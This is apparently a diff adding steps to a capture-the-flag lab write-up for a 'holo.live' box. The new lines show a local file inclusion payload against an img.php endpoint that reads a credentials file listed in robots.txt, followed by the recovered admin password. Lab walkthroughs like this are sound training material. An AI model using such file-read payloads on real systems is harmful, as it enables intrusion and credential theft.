@@ -80,4 +80,19 @@ Disallow: /var/www/admin/dashboard.php
 Disallow: /var/www/admin/supersecretdir/creds.txt
 ```
 
+- Navigate to **dev.holo.live** Found images under the Talents tab.
+- On opening the image found that the `img.php` file is used to fetch images. Seems `LFI` vulnerability.
+```url
+http://dev.holo.live/img.php?file=images/korone.jpg
+```
+- Insert the file path of the credentials file we found in the **robots.txt** at **admin.holo.live/robots.txt**
+```url
+dev.holo.live/img.php?file=/var/www/admin/supersecretdir/creds.txt
+```
+- Got credentials successfully.
+```text
+I know you forget things, so I'm leaving this note for you:
+admin:DBManagerLogin!
+- gurag <3
+```
 
